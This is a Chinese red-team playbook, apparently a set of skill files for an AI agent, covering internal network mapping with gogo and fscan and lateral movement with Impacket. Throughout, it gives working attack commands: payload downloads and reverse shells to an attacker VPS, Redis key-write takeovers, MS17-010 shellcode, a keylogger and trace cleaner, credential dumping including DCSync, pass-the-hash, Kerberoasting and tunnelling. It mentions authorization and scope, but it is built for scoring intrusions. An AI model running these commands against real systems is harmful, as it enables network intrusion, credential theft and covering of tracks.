# redteam-intranet


---

## gogo-intranet

# gogo（内网测绘与指纹引擎）

`gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：
最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、
支持 DSL/workflow 自定义。**先 gogo 铺面，再 fscan 打点。**

## 与 fscan 的分工

| | gogo | fscan |
| --- | --- | --- |
| 强项 | 大网段测绘、指纹、信息提取、可控发包 | 弱口令爆破、未授权、高危漏洞、利用 |
| 默认噪声 | 低（`--opsec`、线程/超时可调） | 高（600 线程 + 爆破 + POC 全开） |
| 输出 | `.dat`（deflate JSON Lines）+ 格式化 | txt/json/csv |
| 典型用法 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/gogo/gogo                （v2.15.0，4.3MB，自带 3138 条指纹）
       $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
       $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）
文档 : https://chainreactors.github.io/wiki/gogo/
模板 : https://github.com/chainreactors/templates

# 跳到跳板机/目标上执行
curl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo
```

**零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。

## 纪律

1. **范围**：`--exclude` / `--exclude-file` 排除授权范围外网段，别把办公网和云元数据段扫了。
2. **先探路再扫描**：`ip a; ip route; arp -a; cat /etc/hosts` —— 内网拓扑往往能省掉一半扫描。
3. **OPSEC**：敏感环境加 `--opsec`，线程压到 `-t 200~500`，超时 `-d 3`；大网段必须 `--ping` 先过滤。
4. **不要 `-p -`（全端口）扫大网段**，那是自杀式发包；先 `top2` 再对存活主机上全端口。

## 核心概念

### 端口预设（这工具的灵魂）

```bash
gogo -P port        # 列出全部预设 tag 与对应端口
```

常用 tag：`top1`(80,443,8080) · `top2`(数百个常见 Web/服务端口) · `top3` · `common`(内网常用) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(全集)

```bash
p 组合：-p top2,win,db          # 逗号任意组合
p 范围：-p 1-1000               # 区间
p 全部：-p -                    # 等于 1-65535（慎用）
p 单点：-p 6379,mysql,12345
```

### 三种扫描模式

| 模式 | 参数 | 适用 |
| --- | --- | --- |
| default | （默认） | 单 IP / 小网段（/24 以内） |
| smart | `-m s` | /24~/16，AB 段探测 + 启发式发散 |
| supersmart | `-m ss` | /16 以上大内网，先探点再筛选网段 |
| sc | `-m sc` | 已知目标段、要更细的端口覆盖 |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### workflow（把复杂命令存成预设）

```bash
gogo -P workflow     # 列出全部 workflow
gogo -w 10           # 等价于扫 10.0.0.0/8 的 supersmart 全流程（all 端口）
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # 内网常见 C 段（10/172/192 三段）
gogo -w 10 -i 11.0.0.0/8 -p top2   # 命令行可覆盖 workflow 参数
```

## 参数速查（实测 v2.15.0 `-h`）

> **多字符长参数必须双横线**：`--ipp`、`--sp`、`--ef`、`--af`。单横线只给 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 这类单字符。

**输入**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   目标，逗号分隔多个
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> 目标列表文件        -L  从 stdin 读目标
-j <file> 复用上次结果(.dat)或 ip:port 列表，继续深挖     -J  从 stdin 读
```

**输出**
```
-f <file>        输出文件名         --path  输出目录
-o <fmt>         命令行输出格式     -O <fmt>  文件输出格式（默认 jsonlines）
--af             自动命名输出文件（.dat，deflate JSON Lines）
--hf             自动命名隐藏文件   -C  关闭压缩      --tee  同时保留控制台输出
-q/--quiet       关日志只留结果（联动其他工具必加）
-F <file>        格式化已有 .dat 结果
--filter / --output-filter / --scan-filter   历史过滤 / 实时过滤 / 提前停止
```

**智能扫描**
```
-m/--mod  default|s|ss|sc    扫描模式
--ping                       先 ICMP 过滤（大网段必须）
-n/--no                      只做智能扫描，不进入默认扫描
--sp   smart 端口探针（默认 80，ss 模式默认 icmp）
--ipp  AB 段 IP 探针（默认 1,254）
```

**性能与隐蔽**
```
-t/--thread <n>     并发（linux 默认 4000，内网建议 200~1000）
-d/--timeout <秒>   超时（默认 2）
-D/--ssl-timeout     SSL 超时
--opsec             低噪声模式（敏感环境开）
-s/--spray          端口优先喷洒（端口数 >500 自动启用）
--no-spray          强制关闭喷洒
```

**指纹与提取**
```
-v/--verbose         主动指纹识别（不发这个只有被动指纹，信息少但安静）
--ff <file>          自定义指纹库
--extract "<regex>"  自定义提取正则
gogo -P extract      查看内置提取规则（jwt / mail / idcard / phone / ip 等）
```

**漏洞（neutron 内核）**
```
-e/--exploit         开启 POC 扫描（与 -v 合用写作 -ev）
-E <name>            指定模板名        --ef <file>  指定模板文件
--payload <s>        指定 payload      --attack-type sniper|clusterbomb|pitchfork
```

**代理**
```
--proxy socks5://127.0.0.1:11111      # 实测可用，走 suo5 / ssh -D 隧道
```

## 标准作业流程（SOP）

```bash
# 0) 探路
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) 大网段测绘（安静、先探活、结果落文件）
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) 看结果（human-like）
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) 对存活主机上全端口 + 主动指纹
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) 定向打 POC（只对确认有指纹的目标）
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <模板名>

# 5) 复用上一步结果继续深挖（不用重扫）
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### 走隧道测绘（内网渗透主路径）

```bash
# 前提：技能 suo5-tunnel 建好 socks5，或 vps-reverse-shell 里 ssh -D
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# 实测：gogo --proxy socks5:// 会把流量真正送进隧道（经 VPS 扫到的是 VPS 的 SSH 指纹）
```

隧道场景把 `-t` 降到 300 以内、`-d` 提到 5，否则隧道会丢包误判。

## 结果落库（必须做）

gogo 的 `.dat` 是压缩 JSON Lines，先格式化再解析入库：

```bash
./gogo -F ./result.dat -o json -f result.json      # 转成 JSON（实测产物结构见下）
python3 tools/parse.py result.json
# 解析要点：顶层是 {config, ip, data:[...]}，每条含 ip/port/protocol/status/frameworks/title/timing
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# 实测单条：{"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#             "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# 入库纪律（与 fscan 相同）
（技能记录：asset_add）      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
（技能记录：web_list）       # 之后由 web 指纹技能补充 URL/标题
（技能记录：vuln_add）       { engagement, target, name, severity, evidence_ref }   # 必须配证据
```

**注意**：gogo 的框架/指纹结果写进 `asset` 的 `fingerprint` 字段，不要只留在终端里。
扫到的敏感信息提取结果（邮箱/身份证/JWT）属于「大量敏感信息」得分点，用 `（技能记录：vuln_add）` +
`（技能记录：score_hit）` 记录，证据落 `runs/`。

## 排障

| 现象 | 处理 |
| --- | --- |
| 参数报错 | 长参数用双横线（`--af` 不是 `-af`），`-P` 只接受 `port/workflow/neutron/extract` |
| 结果文件找不到 | `--af` 写在**二进制同目录**，加 `--path` 指定目录 |
| 大网段几乎没结果 | `--ping` 会漏掉禁 ping 主机；去掉 `--ping` 或改 `--ipp` 调整探针 |
| 扫描太慢 | 提高 `-t`、降低 `-d`；`-p` 换成 `top1`/`top2`；大网段用 `-m ss` |
| 被 IDS 发现 | `--opsec` + `-t 200` + `-d 3`；不要开 `-e`；不要 `-p -` |
| 隧道里大量超时 | 降 `-t`、升 `-d`，隧道带宽是瓶颈 |
| 想只看结果不看日志 | `-q`（联动其他工具必加） |

## 相关技能

- `fscan-intranet`：铺面之后的爆破与利用
- `suo5-tunnel`：WebShell → SOCKS5，给 gogo 提供 `--proxy` 入口
- `vps-reverse-shell`：隧道与载荷投递
- `web-fingerprint` / `asset-correlation`：把 gogo 的结果进一步关联成资产图谱

---

## fscan-intranet

# fscan（内网综合扫描与弱口令/漏洞）

`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、
弱口令、未授权访问、高危漏洞。**噪声大**，只适合内网（对互联网目标用外部扫描技能）。

## 与 gogo 的分工

| | fscan | gogo |
| --- | --- | --- |
| 定位 | 综合普查 + 爆破 + 利用 | 高性能测绘 + 指纹 + 信息提取 |
| 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |
| 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |

**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。

## 二进制

```
本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）
       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）
```

**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：

```bash
# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）
curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
# 或从本机经 shells 上传
```

## 纪律（先看这条）

1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。
2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。内网先用 `-t 100 -time 3`，确认设备扛得住再加。
3. **先无爆破再爆破**：第一轮 `-nobr -nopoc` 只做资产面；确认目标重要性和授权后，第二轮再放开。
4. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。
5. **DNSLog 外带**：`-dns -domain <你的dnslog域名>`，别用公共 DNSLog 传敏感数据。

## 标准作业流程（SOP）

```bash
# 0) 确认自己在哪、能到哪
ip a; ip route

# 1) 存活普查（最快，先圈定活人）
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) 资产面（不爆破、不打 POC，最安静）
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web 优先：把 assets.txt 里的 web 端口交给截图/指纹环节
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) 定向爆破（授权确认后）
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) 高危漏洞与未授权
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## 参数速查（实测 v2.2.1 `-help`）

**目标**
```
-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）
-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件
-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>
```

**端口与存活**
```
-p  21,22,80,443,3306,6379,10000-10100    端口（默认内置约 150 个常用端口）
-pf <file>  端口文件        -ep 排除端口
-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测
-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测
```

**模式**
```
-m all        默认全流程（含爆破+POC）
-m icmp       仅存活
-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         禁爆破   -nopoc 禁 POC   -noredis 禁 Redis 利用
```

**并发与节流**（OPSEC 关键）
```
-t 600       端口扫描线程        -time 3   端口超时(秒)
-mt 20       模块线程            -wt 5     Web 超时
-gt 0        全局超时(秒)        -retry 3  重试次数
-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限
-num 20      POC 并发            -icmp-rate 0.1  ICMP 速率
```

**凭据（爆破）**
```
-user/-pwd      单组账号密码          -userf/-pwdf  字典文件
-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）
-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录
```

**利用（拿到就用，注意授权边界）**
```
-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）
-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 写入内容/文件/路径
-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）
-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机
-fsh-port 4444     正向 Shell 服务端口
```

**代理（打隧道后的核心用法）**
```
-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           走 HTTP 代理
```

**输出**
```
-o result.txt    输出文件        -f txt|json|csv   格式
-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条
-lang zh|en      语言            -log "base,info,success"   日志级别
-dns             记录 DNS 日志（配合 -domain 做外带检测）
-perf            输出性能统计 JSON
```

## 关键场景

### 1. 通过隧道打内网（最常用）

```bash
# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D）
# 实测验证过：fscan -socks5 会把流量真正送进隧道
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。

### 2. 在跳板机上开隧道给本机用

跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：

```bash
./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5
# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@<你的VPS_IP>
# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@<你的VPS_IP>
# 之后所有工具都能 -socks5 127.0.0.1:1080
```

### 3. 拿 Redis 直接要权限

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听
```

### 4. 落到服务器上之后

```bash
./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡
./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）
./fscan -local cleaner           # 痕迹清理
```

## 结果落库（必须做）

fscan 的 txt 输出是分段的，解析后逐条入库：

```bash
# 每台存活主机
（技能记录：asset_add）  { engagement, ip, source: "fscan", tags: ["internal"] }
# 每个开放端口/服务
（技能记录：asset_add）  { engagement, ip, port, service, banner }   # 或 asset_link 关联
# 爆破/未授权成功的凭据与访问
（技能记录：credential_add） { engagement, host, username, secret_type, secret_ref: "runs/fscan-<段>.txt" }
（技能记录：access_add）     { engagement, host, username, method: "ssh", privilege, session_ref }
# 确认的漏洞（必须配 http_evidence 或等价证据）
（技能记录：vuln_add）   { engagement, target, name: "Redis 未授权访问", severity: "high", evidence_ref }
```

**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。

## 排障

| 现象 | 处理 |
| --- | --- |
| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |
| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |
| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |
| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险） |
| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |
| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`，必要时 `-silent` |

## 相关技能

- `gogo-intranet`：先用它铺面
- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
- `webshell-toolkit`：拿到 WebShell 后的管理

---

## lateral-movement

# 内网横向与提权（Impacket 套件）

拿到一台机器和内网可达性之后，**横向到更多主机**（`server-host`）和**找到域控/核心系统**（`central-system`）
是内网阶段的主线。本机已装 **61 个 `impacket-*` 命令**（Kali 自带），是本阶段的主力工具集。

## 本机工具

| 工具 | 路径 | 用途 |
| --- | --- | --- |
| Impacket 套件 | `/usr/bin/impacket-*`（61 个命令） | 协议级横向、凭据转储、Kerberos 攻击 |
| enum4linux | `/usr/bin/enum4linux` | SMB/域信息枚举（用户、共享、策略） |
| smbclient | `/usr/bin/smbclient` | 共享浏览与读写 |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS 名称扫描 |
| proxychains4 | `/usr/bin/proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |

## 零、先做的事（信息决定打法）

```bash
# 1) 看我有什么（凭据/哈希/域信息）
#    （技能记录：credential_list） / （技能记录：access_list） / （技能记录：asset_query）
# 2) 枚举域环境（有域账号后）
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # 无凭据也能枚举出用户/共享/策略

# 3) 共享与文件
smbclient -L //<target> -N                                  # 空会话列共享
smbclient //<target>/<share> -U <user>%<pass>                # 读共享
impacket-smbclient <domain>/<user>:<pass>@<target>           # 交互式，可 cd/ls/get/put
```

**内网扫描仍用 gogo/fscan**（技能 `gogo-intranet` / `fscan-intranet`）——本技能负责"进去之后怎么走"。

## 一、凭据转储（拿到一台机器后的第一优先）

```bash
# 1) 远程 dump SAM/LSA/SECRETS（需管理员凭据）
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # 用哈希直接 dump

# 2) 只 dump 本地 SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync（有域管/复制权限时，直接拿域内所有哈希）—— 直通域控的关键一步
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) 抓明文/票据：配合目标侧工具（如 mimikatz）或 lsassy
#    哈希拿到后用 credential-attack 离线破解，或直接 PtH（见下）
```

**输出处理**：dump 出的 `NTLM` 哈希逐条 `（技能记录：credential_add）`（`source=凭据转储`，
明文的口令写 `secret_value`，哈希写 `note` 或 `secret_value` 并标注类型），文件存 `runs/`。

## 二、Pass-the-Hash（PtH，不用破解直接横向）

```bash
# 命令执行
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # 交互式 SYSTEM shell（噪声大）
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # 半交互，噪声较小（推荐）
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # 单命令，最安静
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # 通过服务执行

# 拿文件
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# 数据库
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec 会落地服务、噪声大、可能被杀软拦**；优先 `wmiexec`/`atexec`。

## 三、Kerberos 攻击（有域环境时）

```bash
# 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 离线破解

# 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) 票据申请与使用
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 用票据横向

# 4) 委派攻击（域内提权路径）
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 四、凭据复用（比攻击快得多，永远先试）

拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：
1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；
2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；
3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。

## 五、隧道配合（内网目标不可直连时）

```bash
# 所有命令加 proxychains4，用临时配置（不要改系统配置）
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
```

## 六、纪律与边界

1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
   不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
2. **噪声控制**：`psexec` 落地服务、`secretsdump` 触碰 LSASS，都会被 EDR 盯上；
   优先 `wmiexec`/`atexec`，控制频率，别对整段做暴力横向。
3. **不要把自己打锁**：域账号连续失败会锁定策略；先用现成凭据复用，弱口令爆破按技能 `credential-attack` 的限流纪律。
4. **破坏性操作禁止**：不要停服务、不要改系统配置、不要删日志（除非演练明确要求且用户同意）。
5. **每台新主机都要登记**：`（技能记录：asset_add）`（内网资产，`scope` 自动 internal），
   访问成功 `（技能记录：access_add）`，凭据 `（技能记录：credential_add）`。

## 七、输出与落库（强制）

1. **每台成功横向的主机记分**：`（技能记录：score_hit）`（`server-host`），`evidence` 写
   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；
   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
3. **凭据落库**：`（技能记录：credential_add）`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
   `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
4. **访问会话落库**：`（技能记录：access_add）`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
5. 每个关键动作 `（技能记录：chain_add）`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），
   **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），
   `result` 写回显摘要——报告要能照着复现。
6. **回填知识库**：验证有效的通用利用脚本 `（技能记录：poc_add）`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。